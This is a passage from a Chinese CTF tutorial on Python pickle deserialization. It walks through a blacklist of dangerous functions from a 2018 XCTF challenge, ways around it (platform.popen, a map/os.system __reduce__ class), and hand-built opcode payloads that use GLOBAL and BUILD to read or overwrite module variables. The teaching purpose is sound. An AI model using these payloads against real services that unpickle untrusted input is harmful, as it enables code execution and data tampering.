&lt;p&gt;&lt;strong&gt;绕过黑名单&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有一种过滤方式：不禁止 &lt;code&gt;R&lt;/code&gt;  指令码，但是对 &lt;code&gt;R&lt;/code&gt;  执行的函数有黑名单限制。典型的例子是 2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：&lt;/p&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可惜 &lt;code&gt;platform.popen()&lt;/code&gt;  不在名单里，它可以做到类似 &lt;code&gt;system&lt;/code&gt;  的功能。这题死于黑名单有漏网之鱼。&lt;/p&gt;
&lt;p&gt;还有一个解，那就是利用 map&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class Exploit(object):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	return map,(os.system,[&amp;quot;ls&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;全局变量包含覆盖c指令码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#全局变量包含覆盖c指令码&#34;&gt;#&lt;/a&gt; 全局变量包含覆盖： &lt;code&gt;c&lt;/code&gt;  指令码&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;c&lt;/code&gt;  指令码可以用来调用全局的 &lt;code&gt;xxx.xxx&lt;/code&gt;  的值&lt;/p&gt;
&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; secret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pickletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;flag&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self,a,b&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.a = a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.b = b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# new_flag = pickle.dumps(flag(&amp;#x27;A&amp;#x27;,&amp;#x27;B&amp;#x27;),protocol=3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# print(new_flag)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# pickletools.dis(new_flag)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;your_payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;?&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;other_flag = pickle.loads(your_payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;secret_flag = flag(secret.a,secret.b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; other_flag.a == secret_flag.a &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; other_flag.b == secret_flag.b:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#123;xxxxxx&amp;#125;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;No!&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# secret.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# you can not see this&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a = &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b = &lt;span class=&#34;string&#34;&gt;&amp;#x27;bbbb&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在的任务是：给出一个字符串，&lt;strong&gt;反序列化之后，a 和 b 需要与 secret 这个 module 里面的 a、b 相对应&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在我们不知道 &lt;code&gt;secret.py&lt;/code&gt;  中值的情况下，如何构造满足条件的 payload，拿到 flag&lt;/p&gt;
&lt;p&gt;不能用 &lt;code&gt;R&lt;/code&gt;  指令码了， &lt;code&gt;c&lt;/code&gt;  指令码专门用来获取一个全局变量。&lt;/p&gt;
&lt;p&gt;我们先弄一个正常的 Student 来看看序列化之后的效果：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Student():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.name = &amp;#x27;sb&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.grade = &amp;#x27;zz&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#     def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#         return (os.system,(&amp;#x27;dir&amp;#x27;,))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = pickle.dumps(Student())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;--------------&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = pickletools.optimize(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;--------------&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickletools.dis(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(&amp;quot;--------------&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nStudent\nq\x00)\x81q\x01&amp;#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x02\x00\x00\x00sbq\x04X\x05\x00\x00\x00gradeq\x05X\x02\x00\x00\x00zzq\x06ub.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nStudent\n)\x81&amp;#125;(X\x04\x00\x00\x00nameX\x02\x00\x00\x00sbX\x05\x00\x00\x00gradeX\x02\x00\x00\x00zzub.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0: \x80 PROTO      3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    2: c    GLOBAL     &amp;#x27;__main__ Student&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   20: )    EMPTY_TUPLE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   21: \x81 NEWOBJ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   22: &amp;#125;    EMPTY_DICT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   23: (    MARK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   24: X        BINUNICODE &amp;#x27;name&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   33: X        BINUNICODE &amp;#x27;sb&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   40: X        BINUNICODE &amp;#x27;grade&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   50: X        BINUNICODE &amp;#x27;zz&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   57: u        SETITEMS   (MARK at 23)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   58: b    BUILD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   59: .    STOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highest protocol among opcodes = 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--------------&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意看 33 和 50 行的变量值，以 name 的为例，只需要把硬编码的 &lt;code&gt;sb&lt;/code&gt;  改成从 &lt;code&gt;secret&lt;/code&gt;  引入的 &lt;code&gt;name&lt;/code&gt; ，写成指令就是： &lt;code&gt;csecret\nname\n&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; 0: \x80 PROTO      3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 2: c    GLOBAL     &amp;#x27;__main__ Student&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20: )    EMPTY_TUPLE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21: \x81 NEWOBJ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22: &amp;#125;    EMPTY_DICT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23: (    MARK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24: X        BINUNICODE &amp;#x27;name&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33: c        GLOBAL 	   &amp;#x27;secret name&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40: X        BINUNICODE &amp;#x27;grade&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50: c        GLOBAL 	   &amp;#x27;secret grade&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57: u        SETITEMS   (MARK at 23)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58: b    BUILD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59: .    STOP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;原来的：b&amp;#x27;\x80\x03c__main__\nflag\nq\x00)\x81q\x01&amp;#125;q\x02(X\x01\x00\x00\x00aq\x03X\x01\x00\x00\x00Aq\x04X\x01\x00\x00\x00bq\x05X\x01\x00\x00\x00Bq\x06ub.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;现在的：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\nflag\nq\x00)\x81q\x01&amp;#125;q\x02(X\x01\x00\x00\x00aq\x03csecret\na\nq\x04X\x01\x00\x00\x00bq\x05csecret\nb\nq\x06ub.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者再举个例子&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-b42656fa4b3c95eaee8c37dccacad636_720w.webp&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;现在的任务是：给出一个字符串，&lt;strong&gt;反序列化之后，name 和 grade 需要与 blue 这个 module 里面的 name、grade 相对应&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;正常的 student 类序列化之后的效果：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8b0cb8c071dadcde37abdce434a8f180_720w.webp&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;以 name 的为例，只需要把硬编码的 &lt;code&gt;rxz&lt;/code&gt;  改成从 &lt;code&gt;blue&lt;/code&gt;  引入的 &lt;code&gt;name&lt;/code&gt; ，写成指令就是： &lt;code&gt;cblue\nname\n&lt;/code&gt; 。把用于编码 &lt;code&gt;rxz&lt;/code&gt;  的 &lt;code&gt;X\x03\x00\x00\x00rxz&lt;/code&gt;  替换成我们的这个 global 指令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-2a5604887f01ef88aebf6409279e82a1_720w.webp&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;顺带一提，由于 pickle 导出的字符串里面有很多的不可见字符，所以一般都经过 base64 编码之后传输。&lt;/p&gt;
&lt;p&gt;如果你也不能手搓 opcode，看看这两个链接？&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMy43L0xpYi9waWNrbGUucHk=&#34;&gt;cpython/pickle.py at 3.7 · python/cpython (github.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9hbmFwaWNrbGUvYmxvYi9tYXN0ZXIvYW5hcGlja2xlLnB5&#34;&gt;anapickle/anapickle.py at master · sensepost/anapickle (github.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;绕过黑名单&lt;/p&gt;
&lt;p&gt;之前提到过， &lt;code&gt;c&lt;/code&gt;  指令（也就是 GLOBAL 指令）基于 &lt;code&gt;find_class&lt;/code&gt;  这个方法， 然而 &lt;code&gt;find_class&lt;/code&gt;  可以被出题人重写。如果出题人只允许 &lt;code&gt;c&lt;/code&gt;  指令包含 &lt;code&gt;__main__&lt;/code&gt; 这一个 module，这道题又该如何解决呢&lt;/p&gt;
&lt;p&gt;通过 GLOBAL 指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过 &lt;code&gt;__main__.blue&lt;/code&gt;  引入这一个 module，由于命名空间还在 main 内，故不会被拦截&lt;/li&gt;
&lt;li&gt;把一个 dict 压进栈，内容是 &lt;code&gt;&amp;#123;&#39;name&#39;: &#39;rua&#39;, &#39;grade&#39;: &#39;www&#39;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;执行 BUILD 指令，会导致改写  &lt;code&gt;__main__.blue.name&lt;/code&gt;  和  &lt;code&gt;__main__.blue.grade&lt;/code&gt;  ，至此 &lt;code&gt;blue.name&lt;/code&gt;  和 &lt;code&gt;blue.grade&lt;/code&gt;  已经被篡改成我们想要的内容&lt;/li&gt;
&lt;li&gt;弹掉栈顶，现在栈变成空的&lt;/li&gt;
&lt;li&gt;照抄正常的 Student 序列化之后的字符串，压入一个正常的 Student 对象，name 和 grade 分别是’rua’和’www’&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由于栈顶是正常的 Student 对象，pickle.loads 将会正常返回。到手的 Student 对象，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1uYW1lZ3JhZGVibHVlLTQ1MHVqOTZlZW4zYmR0MWQ5c3hnLm5hbWU=&#34;&gt;当然 name 和 grade 都与 blue.name&lt;/span&gt;、blue.grade 对应了 —— 我们刚刚亲手把 blue 篡改掉。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-be0b611551c62614ea92f06ffe234480_r.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;\x80\x03c__main__\nblue\n&amp;#125;(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81&amp;#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
